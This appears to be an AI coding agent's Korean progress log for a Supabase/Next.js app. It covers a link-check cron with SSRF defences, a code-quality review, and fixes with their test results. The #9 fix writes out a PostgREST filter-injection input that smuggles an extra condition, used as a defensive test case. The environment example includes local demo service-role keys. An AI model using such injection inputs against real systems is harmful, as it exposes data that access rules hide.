- **점검 로직 (`src/lib/activity-import/link-check.ts`):** 기존 `fetchSinglePage`를 그대로
  재사용해 SSRF 방어가 재확인 시점에도 동일하게 적용된다(사설 IP로 바뀐 호스트도 안전하게
  차단되어 "실패"로 기록됨). 응답이 정상이고 `apply_end_at_evidence`가 저장돼 있으면 그 문자열이
  페이지에서 여전히 발견되는지까지 확인한다(`DEADLINE_STRING_NOT_FOUND`). 원문 전문은 저장하지
  않으므로 매번 새로 가져와 그 자리에서만 비교하고 버린다.
- **엔드포인트 (`src/app/api/cron/link-check/route.ts`):** `CRON_SECRET` 환경변수로 보호되며
  없으면 모든 요청을 거부한다(기본값이 "닫힘"). 배치(기본 20건)씩 claim → 점검 → 기록을 반복해
  한 번 호출에 최대 200건까지 처리한다. `npm run worker:link-check`
  (`scripts/run-link-check-worker.mjs`)로 로컬에서 수동 실행 가능.
- **화면:** `/admin/activities` 목록에 "원문 확인 필요" 배지 + 점검 메모를 추가했다(운영자가
  알림을 놓쳐도 목록에서 바로 보인다).
- **검증:** 단위 테스트 6건(`link-check.test.ts`), RLS 테스트 8건(`link_check_worker.test.ts`
  — **동시에 두 번 호출해도 같은 활동을 중복 claim하지 않음**, 하루 1회 제한, 상태/URL 필터,
  성공·실패 기록, **실패가 반복돼도 알림이 1건으로 유지됨**, anon/일반 사용자 호출 거부). 실제
  로컬 서버(`npm run build && npm run start`)를 띄우고 `curl`로 직접 실행해 전체 파이프라인을
  눈으로 확인했다 — 시드 데이터(활동 17건, 가짜 도메인)를 대상으로 실행하니 전부
  `HTTP_ERROR: 404`로 실패 기록되고 운영자(`admin@smu.ac.kr`) 알림이 생성됐으며, **곧바로 다시
  호출하면 `checked: 0`**(아직 20시간이 지나지 않아 재claim되지 않음)으로 중복 실행 방지가
  실제로 동작함을 확인했다. 이후 로컬 DB를 깨끗한 시드 상태로 다시 리셋해 뒀다.
  `npm test` **274/274 통과**(총 단위 274 + RLS 포함), Playwright E2E **9/9 통과**,
  `lint`·`typecheck`·`build` 모두 성공.

## 6단계 전체 요약

링크 붙여넣기 활동 등록을 4단계(가져오기·SSRF / 추출·검증 / 화면 / 정기 점검)로 나눠 구현했다.
핵심 설계 선택:
- **날짜·링크는 AI가 만들어내지 않는다.** 규칙 기반 정규식이 1차 추출을 담당하고, 모든 날짜
  후보는 "원문에 실제로 있던 문자열"로만 구성된다. LLM은 완전히 선택이며(API 키 없으면 꺼짐),
  날짜는 시스템 프롬프트로 명시 금지하고 스키마에도 없어 응답에 날짜가 와도 버려진다.
- **SSRF 방어가 핵심이다.** 단일 페이지만 가져오고, 모든 리다이렉트 홉을 재검사하며, 사설/
  예약/링크로컬 IPv4·IPv6를 광범위하게 차단한다. 이 방어 때문에 오히려 브라우저로 전체 플로우를
  검증하기 어려워졌다는 역설을 테스트 전용 허용 목록(운영 경로에는 전혀 영향 없음)으로 풀었다.
- **검증 상태(검증됨/원문 확인 필요)는 접수 마감 필드 하나에 대해서만 실제로 추적한다** — 범위를
  넓히는 대신, 가장 중요한 단일 필드에서 "적용 → 추적 → 수동 수정 시 해제 → 정기 점검이 재확인"
  까지 전체 수명주기가 실제로 동작하게 만들었다.
- **매칭 워커와 달리 정기 점검은 pg_cron이 아니라 HTTP 엔드포인트 + 외부 스케줄러로 구현했다** —
  실제 외부 HTTP 요청이 필요한 작업과 순수 DB 로직의 차이를 그대로 설계에 반영한 선택이다.
- 작업 중 두 가지 실제 버그를 테스트가 잡아냈다(둘 다 PROGRESS.md에 기록): robots.txt 와일드카드
  치환 로직 오류, `submit_activity()` 파라미터 추가 시 PostgreSQL 함수 오버로드로 옛 시그니처의
  권한이 남는 문제. 둘 다 "미리 알고 피한 것"이 아니라 테스트가 실제로 발견한 것이다.

## 다음 명령 (사용자 승인 시)

### 1. `.env.example` 직접 반영 필요 (세션이 파일 접근 권한으로 막혀 있었음)

이 세션은 `.env*` 경로에 대한 Read/Write/Bash/PowerShell 접근이 전부 차단돼(권한 설정상
의도된 차단으로 보임) `.env.example`을 직접 수정하지 못했다. 아래 내용을 그대로
`.env.example`에 반영해 주세요(실제 비밀값은 없고, 로컬 데모 키만 포함돼 있어 안전합니다 —
`supabase start` 출력과 동일한 고정값):

```bash
# 필수 — supabase start 출력의 API_URL/ANON_KEY, 또는 클라우드 프로젝트 값
NEXT_PUBLIC_SUPABASE_URL=http://127.0.0.1:54321
NEXT_PUBLIC_SUPABASE_ANON_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZS1kZW1vIiwicm9sZSI6ImFub24iLCJleHAiOjE5ODM4MTI5OTZ9.CRXP1A7WOeoJeXxjNni43kdQwgnWNReilDMblYTn_I0

# 필수 — 서버 전용. 절대 NEXT_PUBLIC_ 접두사를 붙이지 말 것(클라이언트에 노출되면 안 됨).
# supabase start 출력의 SERVICE_ROLE_KEY, 또는 클라우드 프로젝트 값.
SUPABASE_SERVICE_ROLE_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZS1kZW1vIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImV4cCI6MTk4MzgxMjk5Nn0.EGIM96RAZx35lJzdJsyH-qQwv8Hdp7fsn3W0YpN81IU

# 필수 — 매직링크 리다이렉트 허용 origin(오픈 리다이렉트 방지, src/lib/url.ts). 배포 시 실제 도메인으로.
NEXT_PUBLIC_SITE_URL=http://127.0.0.1:3000

# 선택 — 추가로 허용할 origin(쉼표 구분). 로컬에서 127.0.0.1과 localhost를 모두 쓸 때만.
# NEXT_PUBLIC_SITE_URL_ALIASES=http://localhost:3000

# 선택 — 로컬 메일 확인 도구(Mailpit). Playwright E2E가 매직링크를 읽어올 때 씀. 운영에서는 불필요.
NEXT_PUBLIC_INBUCKET_URL=http://127.0.0.1:54324

# 선택 — 테스트 하네스가 pg_cron을 직접 제어할 때 씀(tests/global-setup.ts). 운영 코드 경로에서는 안 씀.
# SUPABASE_DB_URL=postgresql://postgres:postgres@127.0.0.1:54322/postgres

# 링크 붙여넣기 활동 등록(6단계, 2026-10-04 추가) — 정기 점검 엔드포인트(/api/cron/link-check)
# 인증용 임의의 긴 문자열. 설정하지 않으면 이 엔드포인트는 모든 요청을 거부합니다(기본값이 "닫힘").
# 정기 점검을 실제로 쓰려면 필수이고, 값을 외부 스케줄러(Vercel Cron 등)에도 등록해야 합니다.
CRON_SECRET=여기에_임의의_긴_문자열을_넣으세요

# 선택 — URL 가져오기의 LLM 보조(제목/주최기관/태그/유형/자격요약 "후보"만 제안, 날짜는 절대
# 받지 않음)를 켜는 키. 없으면 규칙 기반 추출 + 수동 입력만으로 계속 동작합니다.
# ACTIVITY_IMPORT_LLM_API_KEY=
# ACTIVITY_IMPORT_LLM_PROVIDER=anthropic
# ACTIVITY_IMPORT_LLM_MODEL=claude-haiku-4-5-20251001
```

자세한 설명은 `README.md`의 "환경변수" 절 참조.

### 2. 그 다음

5단계(운영·검증)는 사실상 끝났다. 남은 것은 모두 **외부 설정/검토**이지 추가 구현이 아니다:
- 위 `.env.example` 반영.
- `docs/data-sources.md`의 "운영 전환 전 재확인 체크리스트"(이메일 도메인, 전공 목록, 에브리타임).
- `docs/operations.md` 6절의 개인정보 처리방침 법무 검토.
- 실제 배포(README "배포 방법" 절 참조 — 이번 세션에서는 실행하지 않음).
- (선택) 위 14~16번처럼 시간 제약으로 못 채운 작은 테스트 격차.

## 코드 검수 (품질·효율 — 보안 재탐색 제외, 진행 중)

5-B에서 보안 리뷰는 이미 끝났으므로, 이번 검수는 **죽은 코드·런타임 에러 유발 요소·비효율**에만 집중한다(RLS/SECURITY DEFINER/EXECUTE 권한/SSRF 방어/날짜 검증 로직은 건드리지 않음 — 사용자 지시). 백그라운드 서브에이전트 방식이 응답 없이 멈춰(알 수 없는 플랫폼 지연) 중단했고, 세션에서 직접 범위를 나눠 순서대로 검수하며 끝날 때마다 이 절에 바로 기록한다.

### 범위 1/5: src/lib (완료)

`auth.ts`/`blocks.ts`/`chat.ts`/`errors.ts`/`format.ts`/`nav-badges.ts`/`party.ts`/`reports.ts`/`url.ts`/`matching.ts`/`recommend.ts`/`recommendations/query.ts`/`supabase/*`/`csv/*`/`activity-import/*` 전체(29개 파일)를 직접 읽었다. 전반적으로 품질이 높고(순수 함수 분리, 주입 가능한 의존성, 결정적 처리), 런타임 에러를 유발할 만한 요소나 N+1 패턴은 발견하지 못했다. 각 export(`parseDbError`, `APPLY_PHASE_LABEL`, `isSafeRelativePath`, `describeFetchError` 등 의심 가는 것들)는 실제 사용처를 grep으로 확인했고 전부 쓰이고 있었다.

- **발견 (쓸모없음/Low):** `package.json`의 `dependencies.zod`(`^4.6.5`)가 `src/` 전체 어디에서도 import되지 않는다(`grep -rn 'from "zod"' src/` 0건, PROGRESS.md 5-B 보안 리뷰에서도 "서버 액션 입력 검증에 zod가 전혀 쓰이지 않음"으로 이미 지적됐었지만 제거되지 않고 남아 있었음). → 범위 5(package.json)에서 같이 처리.

### 범위 2/5: src/app 서버 액션·API 라우트 (완료)

`use server` 파일 17개 + `route.ts` 2개(총 19개) 전부 읽었다. `friendlyError`/`parseDbError` 에러 변환 패턴이 전체에 일관되게 적용돼 있다. `admin/activities/actions.ts`의 `createActivity`/`updateActivity`/`bulkImportActivities`/`createMatchTemplateAction` 등은 앱 레벨에서 `isCurrentUserAdmin()`을 호출하지 않지만, `supabase/migrations/20261003120700_rls_policies.sql:118-124`의 `activities_write_insert/update`가 `with check (public.is_admin())`로 이미 운영자만 허용하므로 의도된 설계(RLS가 실제 경계)다 — 버그 아님.

- **발견 (에러 유발/Low):** `src/app/activities/bookmark-actions.ts`의 `toggleBookmark`가 "조회 후 분기"(존재 확인 → insert/delete) 방식이라, 같은 활동을 거의 동시에 두 번 토글하면(연타, 네트워크 재시도 등) 두 번째 insert가 `23505`(unique violation)로 실패해 사용자에게 raw DB 에러 문구(`북마크에 실패했습니다: ...`)가 그대로 노출될 수 있다. 같은 파일 묶음의 `src/app/me/blocked/actions.ts`의 `blockUserAction`은 이미 `error.code !== "23505"`일 때만 실패로 처리하는 같은 패턴의 보호 로직이 있어 비교가 된다. **고치지 않음** — 에러 경로의 사용자 노출 메시지가 "실패"에서 "성공"으로 바뀌는 것이라 "사용자에게 보이는 동작을 바꾸지 말라"는 원칙에 걸릴 수 있어 목록에 "확인 필요"로만 남긴다(아래 표).
- **발견 (에러 유발/Low):** `src/app/admin/activities/actions.ts`의 `deleteMatchTemplateAction`이 DB 에러의 실제 원인과 무관하게 항상 "이미 참가 신청이 있는 템플릿은 삭제할 수 없어요. 대신 비활성화해 주세요."로 고정 메시지를 보여준다 — 실제로는 FK 제약 위반이 아닌 다른 이유(권한, 네트워크 등)로도 같은 문구가 뜰 수 있어 오진단을 유발할 수 있다. **고치지 않음** — 메시지 문구 변경은 사용자에게 보이는 동작 변경이라 "확인 필요"로 남긴다.

### 범위 3/5: src/components·페이지 컴포넌트 (완료)

`src/components/*`(12개) + `src/app` 하위 `page.tsx`(28개) + 그 외 클라이언트 컴포넌트/헬퍼(23개, `queries.ts` 포함) — 총 63개 파일을 전부 읽었다. 전반적으로 로딩/에러/빈 상태/권한없음 네 가지 상태를 일관되게 다루고, 낙관적 업데이트·재시도·행 레벨 액션 패턴이 반복 가능한 수준으로 통일돼 있다.

- **발견 (비효율·N+1/Medium):** `src/app/me/withdraw/page.tsx:26-38`가 "내가 팀장인 파티" 각각에 대해 `for` 루프 안에서 다른 활성 멤버 수를 `count`로 **개별 쿼리**한다(파티가 N개면 쿼리 1 + N번). 한 사용자가 팀장인 파티 수는 보통 작아 체감 영향은 적지만, 구조적으로 명확한 N+1 패턴이라 수정 대상으로 분류한다 — 파티 ID 목록으로 `party_members`를 한 번에 조회해 그룹화하는 방식으로 바꿀 수 있다(사용자에게 보이는 결과는 동일).
- **발견 (쓸모없음/Low):** `src/app/admin/activities/ActivityForm.tsx:9-22`에 `toDateTimeLocalFromIso`와 `toDateTimeLocal`이라는 **완전히 동일한 본문**의 함수 두 개가 나란히 정의돼 있다(복사 붙여넣기로 보임). 하나로 합쳐도 동작은 바뀌지 않는다.
- **발견 (에러 유발/Low, 확인 필요):** `src/app/parties/[id]/edit/EditPartyForm.tsx:14-19`의 `toDatetimeLocal`은 같은 역할을 하는 다른 두 파일(`ActivityForm.tsx`/`SubmitActivityForm.tsx`)의 버전과 달리 `Number.isNaN(date.getTime())` 가드가 없다 — `recruit_deadline`이 혹시라도 해석 불가능한 문자열이면 입력창에 "NaN-NaN-NaNTNaN:NaN"이 그대로 들어간다. 실제로는 DB 컬럼이 항상 유효한 timestamptz거나 null이라 발생 가능성은 매우 낮다. 가드를 추가하는 것 자체는 안전하지만 "확인 필요" 목록에만 남긴다(엣지 케이스 동작이 바뀜).
- **발견 (에러 유발 가능성/Low, 확인 필요):** `src/app/activities/queries.ts:60,66`이 검색어(`filters.q`)와 지역(`filters.region`)을 이스케이프 없이 PostgREST `.or()`/`.ilike()` 필터 문자열에 그대로 끼워 넣는다. 쉼표·괄호·`%`처럼 PostgREST 필터 문법에서 의미를 갖는 문자를 검색어에 입력하면 필터 문법이 깨져 쿼리가 실패할 수 있다 — 다행히 `src/app/activities/page.tsx:40`이 `result.error`를 이미 `ErrorRetry`로 처리해 크래시 없이 "활동을 불러오지 못했습니다"로 끝난다. 사용자가 보는 결과가 "검색 실패"에서 "정상 검색"으로 바뀌는 수정이라 목록에만 남긴다.
### 범위 4/5: supabase/migrations DB 함수·인덱스 (완료, 읽기 전용 — 기존 파일 수정 없음)

30개 마이그레이션 파일(5536줄)을 전부 읽거나(작은 파일) 또는 함수/인덱스 정의를 중심으로 훑었다(큰 파일). 기존 인덱스 전체 목록(`create index`/`create unique index` 27건)과 모든 FK 컬럼(`references public....`)을 대조해 색인 공백을 확인했고, `_find_match_for_group`/`run_match_worker`/`approve_application` 등 핵심 함수의 루프는 전부 "팀/제안 멤버 수"처럼 크기가 작게 bounded된 집합을 순회해 추가로 고칠 만한 N+1은 없었다(기존 설계가 `FOR UPDATE SKIP LOCKED`·임시 테이블·int4multirange 연산자를 이미 신중하게 쓰고 있다).

- **발견 (비효율·인덱스 누락/Medium, 실제 수정 대상):** `match_proposal_members.queue_id`(마이그레이션 `20261004040000`에서 `ON DELETE CASCADE`로 바뀐 그 컬럼)에 인덱스가 없다. 이 컬럼은 (1) `_cancel_matching_queue_for_activity`(`20261003170100_matching_functions.sql:558`)와 `/match/[activityId]` 페이지(`src/app/match/[activityId]/page.tsx:145`)에서 직접 `where queue_id = ...`로 조회되고, (2) `ON DELETE CASCADE` FK의 대상이라 `matching_queue` 행이 지워질 때마다(활동 삭제 등) Postgres가 이 테이블을 스캔해 자식 행을 찾는다. 둘 다 추측이 아니라 실제 조회·삭제 경로다. → 새 마이그레이션으로 `match_proposal_members(queue_id)` 인덱스 추가.
- **발견 (비효율·인덱스 누락/Medium, 실제 수정 대상):** `matching_queue`에 `(status, activity_id, template_id)`를 함께 인덱싱하는 색인이 없다. `run_match_worker()`가 **pg_cron으로 매분 자동 실행**되며 그 안에서 (a) `select distinct activity_id, template_id from matching_queue where status='waiting'`, (b) `_find_match_for_group`의 `where activity_id=... and template_id=... and status='waiting' ... for update skip locked` 두 쿼리를 매번 돌린다 — 1회성 페이지 조회가 아니라 상시 반복 실행되는 워크로드라 "측정 근거 있음"으로 판단했다. `/match/[activityId]` 대기 화면(`WaitingPanel`)의 `eq("activity_id",...).eq("template_id",...).eq("status","waiting")` 조회도 같은 인덱스로 이득을 본다. → 새 마이그레이션으로 `matching_queue(status, activity_id, template_id)` 인덱스 추가.
- **발견 (인덱스 공백/Low, 확인 필요만 — 고치지 않음):** `blocks` 테이블은 PK가 `(blocker_id, blocked_id)`뿐이라 `blocked_id` 단독 조건(여러 화면이 쓰는 `.or('blocker_id.eq.X,blocked_id.eq.X')`)은 인덱스를 못 탄다. 구조적으로는 맞지만 이 앱 규모(학교 과제 데모)에서 실제 느려짐을 관측하거나 측정한 적은 없어 "추측성 최적화 금지" 원칙에 따라 고치지 않고 기록만 남긴다.

### 범위 5/5: scripts·package.json 의존성 (완료)

`scripts/run-match-worker.mjs`·`scripts/run-link-check-worker.mjs`는 둘 다 짧고 문제 없음(개발용 1회 실행 스크립트, 운영 경로인 pg_cron/외부 cron과 역할이 분리됨을 주석으로 명시). `package.json`의 모든 의존성에 대해 실제 import 여부를 grep으로 전수 확인했다.

- **발견 (쓸모없음/Low, 실제 수정 대상):** `dependencies.zod`(범위 1에서 이미 발견)와 `devDependencies`의 `@testing-library/react`·`@testing-library/jest-dom`이 `src/`·`tests/`·설정 파일 어디에도 전혀 참조되지 않는다. 테스트 스위트에 `.test.tsx`(컴포넌트 렌더링 테스트) 파일이 한 개도 없고(`tests/unit`·`tests/rls` 전부 `.test.ts`), `tests/setup.ts`도 `@testing-library/jest-dom`의 커스텀 matcher를 import하지 않는다. → 제거 대상.
- **확인했지만 살려둔 것:** `@vitejs/plugin-react`(vitest.config.ts의 `plugins: [react()]`)와 `jsdom`(같은 파일의 `environment: "jsdom"`)은 설정에서 실제로 참조되고 있어 "미사용"으로 분류하지 않았다 — 지금 당장은 `.tsx` 테스트가 없어 엄밀히는 불필요할 수 있지만, 향후 컴포넌트 테스트를 추가할 가능성에 대비한 테스트 하네스 설정이라 제거하면 범위를 벗어난 추측성 변경이 된다. `pg`는 `tests/rls/execute_privileges.test.ts`·`tests/global-setup.ts`에서 실제로 쓰인다(살아있음).

---

## 종합 — 심각도순 수정 대상 표

| # | 심각도 | 분류 | 파일 | 문제 | 영향 | 수정 방안 | 상태 |
|---|---|---|---|---|---|---|---|
| 1 | Medium | 비효율(상시 반복 워크로드) | `supabase/migrations`(신규) | `matching_queue`에 `(status, activity_id, template_id)` 복합 인덱스 없음 — `run_match_worker()`가 pg_cron으로 **매분** 이 조합으로 스캔 | 활동·템플릿 수가 늘수록 매분 풀스캔 비용 증가 | 신규 마이그레이션으로 인덱스 추가(순수 추가, 동작 불변) | ✅ 완료 |
| 2 | Medium | 비효율(인덱스 누락) | `supabase/migrations`(신규) | `match_proposal_members.queue_id`(ON DELETE CASCADE FK) 인덱스 없음 — 직접 조회 2곳 + CASCADE 삭제마다 스캔 | 조회·활동 삭제 시 불필요한 전체 스캔 | 신규 마이그레이션으로 인덱스 추가(순수 추가, 동작 불변) | ✅ 완료 |
| 3 | Medium | 비효율(N+1) | `src/app/me/withdraw/page.tsx:26-38` | 팀장인 파티 수(N)만큼 `count` 쿼리를 반복 실행 | 쿼리 1+N번(팀장 파티가 많을수록 느려짐) | 파티 ID 목록으로 한 번에 조회해 그룹화(결과 동일) | ✅ 완료 |
| 4 | Low | 쓸모없음(죽은 의존성) | `package.json` | `zod`가 `src/` 어디에도 import되지 않음 | 불필요한 설치 용량 | `dependencies`에서 제거 + lockfile 갱신 | ✅ 완료 |
| 5 | Low | 쓸모없음(죽은 의존성) | `package.json` | `@testing-library/react`·`@testing-library/jest-dom`이 쓰이지 않음(`.test.tsx` 없음) | 불필요한 설치 용량 | `devDependencies`에서 제거 + lockfile 갱신 | ✅ 완료 |
| 6 | Low | 쓸모없음(중복 코드) | `src/app/admin/activities/ActivityForm.tsx:9-22` | `toDateTimeLocalFromIso`/`toDateTimeLocal` 완전 동일 함수 2개 | 유지보수 혼란 | 하나로 병합 | ✅ 완료 |
| 7 | Low | 에러 유발(에러 메시지 정확도) | `src/app/admin/activities/actions.ts`(`deleteMatchTemplateAction`) | 모든 삭제 실패를 "이미 신청 있음" 고정 문구로 표시 | 다른 원인(권한·네트워크)도 같은 문구로 오진단 | `23503`(FK 위반)만 그 문구, 그 외는 일반 문구로 분기 | ✅ 완료 |
| 8 | Low | 에러 유발(동시성) | `src/app/activities/bookmark-actions.ts`(`toggleBookmark`) | 조회 후 분기 방식 — 연타 시 두 번째 요청이 `23505`로 raw 에러 노출 | 드문 경쟁 상황에서 사용자에게 기술적 에러 문구 노출 | `isDuplicateKeyError`로 `23505`를 성공 처리 + raw 에러 노출 7곳 전체 정리 | ✅ 완료 |
| 9 | Low | 에러 유발(필터 문법) | `src/app/activities/queries.ts:60,66` | 검색어/지역에 쉼표·괄호 등이 있으면 PostgREST 필터 문법이 깨짐 | 이미 `ErrorRetry`로 안전하게 처리되어 크래시는 없음, 다만 검색이 조용히 실패 | `escapeOrFilterValue`로 값을 큰따옴표 리터럴로 감싸 조립 | ✅ 완료 |
| 10 | Low | 에러 유발(가드 불일치) | `src/app/parties/[id]/edit/EditPartyForm.tsx:14-19` | `toDatetimeLocal`에 날짜 파싱 실패 가드 없음(다른 2개 버전엔 있음) | `recruit_deadline`이 비정상 값일 때 입력창에 "NaN" 표시 가능(실제 발생 가능성 매우 낮음) | `Number.isNaN` 가드 추가 + 클라이언트·서버 양쪽에 `validateRecruitDeadline` 적용 | ✅ 완료 |

#1~#6은 애초에 "사용자에게 보이는 동작 불변" 원칙 안에서 바로 진행했다. #7~#10은 처음엔 동작이 달라진다고 보류했으나, 사용자가 "오류 상황의 동작만 바뀌는 버그 수정이니 진행해도 된다"고 확정해 와서 추가 커밋으로 모두 수정했다 — 상세는 아래 "확인 필요 4건 — 전부 수정함" 참조.

### 적용 순서와 검증 결과

1. **쓸모없는 코드 (#4·#5·#6, 커밋 `3a3b0f8`):** `zod`/`@testing-library/react`/`@testing-library/jest-dom` 제거(`npm install`로 lockfile 갱신, 20개 패키지 제거) + `ActivityForm.tsx`의 중복 함수 병합. 검증: `lint`/`typecheck`/`build` 통과, `npm test` 274/274 통과.
2. **비효율 (#1·#2·#3):** `matching_queue(status, activity_id, template_id)`·`match_proposal_members(queue_id)` 인덱스를 새 마이그레이션(`20261004110000`, `20261004120000`)으로 추가(기존 마이그레이션 파일은 수정하지 않음) + `/me/withdraw` 페이지의 N+1 쿼리를 파티 ID 목록 기반 단일 쿼리로 교체(반환 결과는 동일). 검증: `supabase db reset`으로 새 마이그레이션이 깨끗이 적용됨을 확인 → `lint`/`typecheck`/`build` 통과 → `npm test` 274/274 통과 → `npm run test:e2e` 9/9 통과.

### "확인 필요" 4건 — 전부 수정함 (추가 커밋)

사용자가 "오류 상황의 동작만 바뀌는 버그 수정이니 진행해도 된다"고 확정해 와서, 위 표 #7~#10을 전부 수정했다. 정상 동작(성공 경로)은 그대로고, 지금까지 "실패하거나 혼란스러운 메시지를 보던" 오류 상황만 더 명확해진다.

- **#9 (검색어 필터 주입):** `src/app/activities/queries.ts`에 `escapeOrFilterValue`/`buildActivitySearchOrFilter`를 추가했다. PostgREST `or()` 필터는 원문 문자열을 그대로 서버로 보내고 서버가 쉼표로 조건을 나누므로, 검색어를 꺼내 쓰기 전에 값 전체를 큰따옴표로 감싸고 그 안의 백슬래시·큰따옴표만 이스케이프한다(PostgREST의 "예약 문자를 큰따옴표로 감싸면 리터럴로 취급" 규칙). `"a,is_public.eq.false"`처럼 쉼표로 조건을 추가하려 해도, `"%"`·`"()"`처럼 ILIKE/그룹 문법에 쓰이는 문자를 넣어도 항상 title/org_name에 대한 ILIKE 조건 2개로만 조립된다. 단위 테스트(`tests/unit/activities-search-filter.test.ts`, 실제 PostgREST의 쉼표 분해 규칙을 흉내 낸 분해기로 "조건이 정확히 2개"임을 확인)와 실제 서버 대상 통합 테스트(`tests/rls/activities_search_filter.test.ts`, 같은 입력들로 `queryActivities`를 직접 호출해 에러 없이 끝남을 확인) 둘 다 추가했다.
- **#8 (북마크 연타) + 다른 raw DB 에러 노출 전수 정리:** `src/lib/errors.ts`에 `isDuplicateKeyError(error)`(23505 판정, 단위 테스트 포함)를 추가해 `toggleBookmark`가 연타로 두 번째 insert가 23505여도 성공으로 처리하게 했다(이미 같은 패턴이던 `blockUserAction`과 통일). 이 김에 **대소문자를 구분하던 이전 grep(`error.message`)이 놓쳤던 `profileError.message`(`onboarding/actions.ts`)를 포함해** DB 에러 원문을 그대로 보여주던 7곳(`bookmark-actions.ts`, `me/blocked/actions.ts`, `recommendation-actions.ts`, `admin/activities/actions.ts`의 5개 함수, `onboarding/actions.ts`)을 전부 일반 사용자 문구로 바꿨다. DB 동작 자체(23505/23503이 실제로 그 코드를 내는지)는 `tests/rls/bookmarks_and_templates.test.ts`로 확인한다. `login/LoginForm.tsx`(Supabase Auth 서비스 메시지)와 `api/cron/link-check/route.ts`(사용자 화면이 아닌 운영 모니터링 엔드포인트)는 범주가 달라 그대로 뒀다.
- **#10 + #3 (파티 수정 폼 날짜):** `src/lib/party.ts`에 `validateRecruitDeadline`(빈 값 허용, NaN·과거 1일 초과·미래 548일 초과를 가려내는 순수 함수, 단위 테스트 `tests/unit/party.test.ts`)을 추가했다. `EditPartyForm.tsx`의 `toDatetimeLocal`에 누락됐던 `Number.isNaN` 가드를 추가하고(#10), 제출 시 `validateRecruitDeadline`으로 먼저 검사해 "모집 마감: ..." 형식으로 어느 칸이 문제인지 알려준 뒤에만 제출한다(#3, 클라이언트). **서버 액션**(`parties/actions.ts`의 `updatePartyDetailsAction`)에도 같은 검사를 추가해, 액션이 폼을 거치지 않고 직접 호출돼도 잘못된 문자열이 RPC(timestamptz 인자)로 그대로 넘어가 알아보기 힘든 Postgres 타입 오류를 띄우는 일이 없게 했다. 같은 버그 계열(NaN 가드 없는 초기값)이 없는 `NewPartyForm.tsx`(파티 생성)에도 동일한 클라이언트 검사와 `createPartyAction` 서버 검사를 일관되게 추가했다.
- **#7 (템플릿 삭제 실패 메시지):** `admin/activities/actions.ts`의 `deleteMatchTemplateAction`이 `error.code === "23503"`(FK 위반 — 대기열/제안이 참조 중)일 때만 "이미 참가 신청이 있는 템플릿은..." 문구를 보여주고, 그 외 원인(권한·네트워크 등)은 "템플릿 삭제에 실패했습니다. 잠시 후 다시 시도해 주세요."로 구분했다. `tests/rls/bookmarks_and_templates.test.ts`가 두 경로(참조 있음 → 23503, 참조 없음 → 정상 삭제) 모두 확인한다.

### Zod 제거 이후 서버 액션 입력 검증 점검 (요청 5번)

`zod` 제거 전후로 변하는 것이 없는지 `src/app/**/actions.ts` 19개 전부를 다시 훑었다. 결론: **Zod를 다시 추가하지 않는다.** 이 코드베이스는 원래부터 "입력 검증은 1차적으로 DB(SECURITY DEFINER 함수의 명시적 체크 또는 테이블 CHECK/FK 제약)가 책임지고, 서버 액션은 그 에러를 사용자에게 보여줄 말로만 바꾼다"는 설계였다(PROGRESS.md 5-B 보안 리뷰에서 이미 같은 결론: "zod 미사용은 Low — 실제 악용 사례 못 찾음"). 이번 점검으로 그 경계가 실제로 지켜지는지 확인했고, 유일한 구멍은 "DB가 거부했을 때 원문 에러를 그대로 보여주는가"였다 — 이번에 전부 고쳤다(위 #8 참조). 남은 건 전부 사소하고 범위를 벗어난다:

| 파일 | 항목 | 현재 상태 | 비고 |
|---|---|---|---|
| `admin/activities/actions.ts`(`toRow`) | `team_min_size`/`team_max_size` | 숫자가 아닌 문자열이면 `Number()`가 `NaN`을 만들고, `JSON.stringify`가 `NaN`을 `null`로 바꿔 **조용히 무시**된다(에러도, 크래시도 없음) | `<input type="number">`라 브라우저가 숫자 아닌 입력을 막아 실제 도달 가능성은 낮다. 지금 막으면 "조용히 null 처리"에서 "제출 거부"로 동작이 바뀌므로 이번 범위(오류 경로만 수정)를 벗어나 고치지 않음 |
| `onboarding/actions.ts`(`saveProfile`) | `grade`/`day_of_week`/`weeklyAvailableHours` 등 | 범위는 DB CHECK 제약(`grade between 1 and 10`, `day_of_week between 0 and 6`)이 막고, 실패 메시지는 이번에 일반 문구로 바꿨다(#8) | UI가 애초에 1~4학년·요일 선택 버튼만 제공해 실제로는 도달 불가 |
| `activities/bookmark-actions.ts`/`me/blocked/actions.ts` | `activityId`/`blockedId` 형식(UUID) | 형식이 틀리면 Postgres가 `22P02`(잘못된 입력 형식)로 거부 → 이제 일반 문구로 안내됨 | 링크 자체가 서버에서 만든 UUID라 사용자가 직접 바꿔 보낼 때만 발생 |
| 그 외 모든 RPC 기반 액션 | 전반 | SECURITY DEFINER 함수가 자체적으로 검증(예: `create_report`의 사유 CHECK·빈도 제한, `submit_activity`의 URL 스킴 검사)하고 `friendlyError`로 안내 | 5-A/5-B에서 이미 구축된 패턴, 이번에 다시 확인만 함 |

### 검증 결과 (전체)

`lint`/`typecheck`/`build` 통과 → `supabase db reset` → `npm test` **299/299 통과**(기존 274 + 신규 25: 필터 주입 방어 단위/통합, 날짜 검증 단위, 중복키 판정 단위, 북마크·템플릿 DB 동작 통합) → `npm run test:e2e` **9/9 통과**.

### 다음에 할 일

이번 요청으로 "확인 필요" 4건을 모두 수정했고, Zod 재도입은 불필요하다고 판단해 도입하지 않았다. 남은 건 위 표의 세 가지 사소한 항목(모두 UI 제약·DB CHECK로 실질적 도달 불가능)뿐이며, 그 외 추가로 발견된 작업은 없다.

## G1: 공통 어휘와 전공 (티처블 머신 연동, 완료)

`docs/teachable-machine-integration.md`(구현 기준)와 `docs/tm-design-guidelines-original.md`(원 설계)를 먼저 커밋한 뒤, 9장 작업 단위 표의 G1을 진행했다. 범위: 3.1(관심분야 12개), 3.3(전공), 3.4 중 `weekly_hours`만(나머지 eligibility 필드는 G2), 프로필·온보딩 화면, 시드 재작성. 완료 기준은 8장 체크리스트 1~3번.

